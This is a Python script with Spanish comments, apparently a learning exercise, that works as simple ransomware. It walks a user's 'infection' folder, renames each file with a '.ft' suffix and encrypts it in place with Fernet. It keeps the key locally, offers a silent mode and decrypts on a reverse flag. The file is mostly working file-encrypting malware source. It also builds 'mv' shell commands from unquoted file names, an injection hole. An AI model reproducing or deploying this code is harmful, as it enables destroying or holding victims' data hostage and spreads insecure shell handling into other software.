# Realizado por Solo a 04/08/2022 última actualización 04/08/2022 WIP.


#--------------------------------------------------------------------------------------------------------
#-----------------------------------------LIBRERIAS------------------------------------------------------

import argparse
import os
from cryptography.fernet import Fernet

#--------------------------------------------------------------------------------------------------------
#-----------------------------------------VARIABLES------------------------------------------------------

# deprecated jajajajajjaja users = {}
user = os.popen('whoami').read()[:-1]
ruta = "/home/"+user+"/infection"

#--------------------------------------------------------------------------------------------------------
#---------------------------------------CONFIGURACION----------------------------------------------------

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--reverse", help = 'Desencripta todos los archivos con extensión ".ft"... Si tienes la clave adecuada claro', action = 'store_true', default = False)
parser.add_argument('-v', '--version', action = 'version', version = 'beta 1.0', help = "Muestra la versión del programa, por si deseas actualizarlo")
parser.add_argument('-s', '--silent', help = "Ejecuta el programa sin que salga nada por consola ﱲ", action= "store_true", default = False, dest = 'ninja')
args = parser.parse_args()
with open (".claves.key", "a") as archivo_clave:
        pass

#--------------------------------------------------------------------------------------------------------
#-----------------------------------------FUNCIONES------------------------------------------------------

def listar_archivos(ruta):
    
    archivos = []
   
    nombres = os.popen('find '+ ruta +' -type f 2> /dev/null').read()
    if nombres != '':
        nombres = nombres.strip('\n').replace('./', '').split('\n')
        for elem in nombres:
            if args.reverse:
                if elem.endswith('.ft') and (len(elem.split('.')) > 2):
                    if '.unknow' in elem:
                        os.system(f"mv {elem} {elem.split('.')[0]}")
                        archivos.append(elem.split('.')[0])
                    else:
                        os.system(f"mv {elem} {elem[:-3]}")
                        archivos.append(elem[:-3])
            else:
                if not elem.endswith('.ft'):
                    if '.' not in elem:
                        os.system(f"mv {elem} {elem}.unknow.ft")
                        archivos.append(elem + '.unknow.ft')
                    else:
                        os.system(f"mv {elem} {elem}.ft")
                        archivos.append(elem + '.ft')
    return archivos

    

def guardar_key(user):
    with open (".claves.key", "r") as archivo_clave:
        for linea in archivo_clave:
            if (user + ' :') in linea[:(len(user) + 2)]:
                if not args.ninja and not args.reverse:
                    print ('El usuario ya existe. Ya te hemos hackeado?')
                return 0
        key = Fernet.generate_key()
        with open (".claves.key", "a") as archivo_clave:
            archivo_clave.write(user + ' : ' + str(key) + '\n')
        if not args.ninja:
            print ('Clave generada con exito.')

def recuperar_key(user):
    try:
        with open('.claves.key', 'r') as key_file:
            for linea in key_file:
                if (user + ' :') in linea[:(len(user) + 2)]:
                    key = linea.split(':')[1].strip()[2:-1]
                    return key.encode()
                else:
                    if not args.ninja:
                        print ("No hay usuarios con ese nombre registrados.")
    except:
        if not args.ninja:
            print ("No hay registros.")

def codificar(lista, key):
    for elem in lista:
        with open (elem, 'rb') as file:
            mensaje = file.read()
            f = Fernet(key)
            encriptado = f.encrypt(mensaje)
        with open (elem, 'wb') as cryp:
            cryp.write(encriptado)
        if not args.ninja:
            print (f"ﱘﱘ Cojo {elem.split('/')[-1]}, lo encripto con una clave, y ya son un monton de ficheros que he encriptado esta tarde. ﱘﱘ")

def decodificar(lista, key):
    for elem in lista:
        with open (elem, 'rb') as file:
            mensaje = file.read()
            f = Fernet(key)
            encriptado = f.decrypt(mensaje).decode()
        with open (elem, 'w') as cryp:
            cryp.write(encriptado)
        if not args.ninja:
            print (f"Ya puedes volver a leer {elem}")

#--------------------------------------------------------------------------------------------------------
#-----------------------------------------EJECUCION------------------------------------------------------

if not args.ninja:
    if args.reverse:
        print ("Venga, va, recuperemos esa información valiosísima")
    else:
        print ("Encriptemos cosas")

archivos = listar_archivos(ruta)


if not args.ninja:
    print ("Estamos analizando los archivos con los que trabajar.")
    if not archivos:
        print ("Pues parece que no hay nada con lo que trabajar")
        print ("Lo mas probable es que la ruta no exista o que no haya archivos con los que trabajar")
    else:
        print ("Estos son los archivos que hemos encontrado:")
        for elem in archivos: print (f"- {elem}")

        guardar_key(user)

        if args.reverse:
            decodificar(archivos, recuperar_key(user))
        else:
            codificar(archivos, recuperar_key(user))